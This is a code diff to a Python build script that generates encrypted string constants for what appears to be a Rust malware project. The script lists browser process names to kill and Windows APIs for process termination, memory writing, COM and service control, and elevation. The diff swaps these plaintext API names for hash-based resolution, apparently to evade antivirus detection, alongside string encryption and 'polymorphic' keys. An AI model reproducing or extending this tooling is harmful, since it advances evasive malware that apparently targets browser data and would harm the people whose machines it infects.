@@ -28,17 +28,9 @@ def format_const_slice(name: str, data: bytes, pub: bool = False) -> str:
 
 
 def generate_kill_strings() -> list:
+    # Only browser/helper exe names remain here; Win32 API names are now
+    # resolved by hash (api_hash.rs) — no strings needed.
     strings = [
-        ("KILL_K32", "kernel32.dll"),
-        ("KILL_CTX_SNAP", "CreateToolhelp32Snapshot"),
-        ("KILL_P32_FIRST", "Process32FirstW"),
-        ("KILL_P32_NEXT", "Process32NextW"),
-        ("KILL_OPEN_PROC", "OpenProcess"),
-        ("KILL_TERM_PROC", "TerminateProcess"),
-        ("KILL_CLOSE_H", "CloseHandle"),
-        ("KILL_WPM", "WriteProcessMemory"),
-        ("KILL_MOVEFILE", "MoveFileExW"),
-        ("KILL_GETMODULE", "GetModuleFileNameW"),
         ("KILL_CHROME", "chrome.exe"),
         ("KILL_EDGE", "msedge.exe"),
         ("KILL_BRAVE", "brave.exe"),
@@ -94,32 +86,9 @@ def generate_lib_strings() -> list:
 
 
 def generate_elev_strings() -> list:
-    strings = [
-        ("ELEV_K32", "kernel32.dll"),
-        ("LOADLIB", "LoadLibraryA"),
-        ("GETPROC", "GetProcAddress"),
-        ("OLE32", "ole32.dll"),
-        ("OLEAUT32", "oleaut32.dll"),
-        ("ADVAPI32", "advapi32.dll"),
-        ("COINIT", "CoInitializeEx"),
-        ("COUNINIT", "CoUninitialize"),
-        ("COCREATE", "CoCreateInstance"),
-        ("COPROXY", "CoSetProxyBlanket"),
-        ("SYSALLOC", "SysAllocStringByteLen"),
-        ("SYSFREE", "SysFreeString"),
-        ("SYSLEN", "SysStringByteLen"),
-        ("OPENSCM", "OpenSCManagerW"),
-        ("OPENSVC", "OpenServiceW"),
-        ("STARTSVC", "StartServiceW"),
-        ("CLOSESVC", "CloseServiceHandle"),
-        ("ADDVEH", "AddVectoredExceptionHandler"),
-    ]
-    result = []
-    for name, plaintext in strings:
-        key = os.urandom(32)
-        ct, nonce = aes256gcm_encrypt(plaintext.encode('utf-8'), key)
-        result.append((name, key, nonce, ct))
-    return result
+    # All Win32 API and DLL names are now resolved by hash (api_hash.rs).
+    # This function is kept for structural compatibility but returns nothing.
+    return []
 
 
 def generate_polymorphic_keys(output_dir: str):
